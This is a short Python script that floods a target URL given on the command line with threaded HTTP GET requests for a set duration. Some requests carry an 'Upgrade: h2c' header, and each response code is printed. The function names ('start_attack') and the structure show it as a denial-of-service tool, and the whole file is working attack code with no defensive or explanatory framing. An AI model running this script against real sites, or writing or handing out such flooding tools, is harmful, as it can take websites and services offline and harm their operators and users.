import requests
import sys
import threading
import time

def pogi(target_url, duration):
    start_time = time.time()
    end_time = start_time + duration

    while time.time() < end_time:
        try:
            # HTTP/1.1 request
            response = requests.get(target_url)
            print(f"HTTP/1.1 Status Code: {response.status_code}")

            # HTTP/2 request (if supported)
            response = requests.get(target_url, headers={"Upgrade": "h2c"})
            print(f"HTTP/2 Status Code: {response.status_code}")

        except Exception as e:
            print(f"Error: {e}")

def start_attack(target_url, num_threads, duration):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=pogi, args=(target_url, duration))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_url = sys.argv[1]
    num_threads = int(sys.argv[2])
    duration = int(sys.argv[3])
    start_attack(target_url, num_threads, duration)
